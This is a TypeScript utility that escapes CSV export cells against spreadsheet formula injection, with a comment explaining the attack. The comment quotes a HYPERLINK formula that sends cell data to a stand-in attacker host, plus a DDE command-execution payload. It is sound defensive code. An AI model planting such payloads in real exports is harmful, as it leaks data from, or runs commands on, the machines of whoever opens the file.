/**
 * CSV cells that a spreadsheet will not execute.
 *
 * Quoting makes a value survive the CSV grammar. It does nothing about what
 * Excel, LibreOffice and Google Sheets do AFTER parsing: a cell whose text
 * begins with `=`, `+`, `-`, `@`, or a leading tab/CR is treated as a formula
 * and evaluated on open. So a contact named
 *
 *   =HYPERLINK("https://evil.example/?"&A1,"Click me")
 *
 * is stored harmlessly, exports as a correctly-quoted cell, and then runs in
 * the spreadsheet of whoever opens the export. `=cmd|'/c calc'!A1` is the same
 * trick aimed at DDE. The attacker writes ordinary data through the ordinary
 * API; the victim is an administrator doing an ordinary export.
 *
 * The fix is to make the value not start a formula. We prefix a single quote
 * (`'`) — the escape every major spreadsheet understands as "this cell is
 * text". It is visible in the raw file but not in the spreadsheet UI, which is
 * the tradeoff worth taking: mangling the data (stripping the character) would
 * silently corrupt legitimate values like negative numbers written as text.
 *
 * Negative numbers are the reason `-` needs care. A real numeric cell exported
 * as `-42` must stay a number, so only values that are NOT valid numbers get
 * the prefix.
 */

/** Characters that make a spreadsheet treat the rest of the cell as a formula. */
const FORMULA_START = /^[=+\-@\t\r]/;

/** `-3.5`, `+2`, `1e9` — values a spreadsheet should still read as numbers. */
const NUMERIC = /^[+-]?(\d+\.?\d*|\.\d+)([eE][+-]?\d+)?$/;

/**
 * Render one value as a quoted, formula-safe CSV cell (quotes included).
 *
 * Objects are JSON-stringified and Dates rendered as ISO — a Date must be
 * handled before the object branch, because `JSON.stringify(date)` returns an
 * already-quoted string that would then be re-quoted into `"""2026-…"""`:
 * valid CSV, garbled timestamp.
 */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return '""';
  const raw =
    value instanceof Date
      ? value.toISOString()
      : typeof value === 'object'
        ? JSON.stringify(value)
        : String(value);

  // A genuine number keeps its sign; anything else that could start a formula
  // is prefixed so the spreadsheet treats the cell as text.
  const safe = FORMULA_START.test(raw) && !NUMERIC.test(raw) ? `'${raw}` : raw;
  return `"${safe.replace(/"/g, '""')}"`;
}

/**
 * Render rows as a CSV document.
 *
 * Columns come from the union of every row's keys, not just the first row's:
 * taking `Object.keys(records[0])` silently drops columns whenever rows are
 * ragged, which they are as soon as a collection gains a field.
 */
export function recordsToCsv(records: Record<string, unknown>[]): string {
  if (records.length === 0) return '';
  const keys: string[] = [];
  const seen = new Set<string>();
  for (const r of records) {
    for (const k of Object.keys(r)) {
      if (!seen.has(k)) {
        seen.add(k);
        keys.push(k);
      }
    }
  }
  const header = keys.map((k) => csvCell(k)).join(',');
  const rows = records.map((r) => keys.map((k) => csvCell(r[k])).join(','));
  return [header, ...rows].join('\r\n');
}
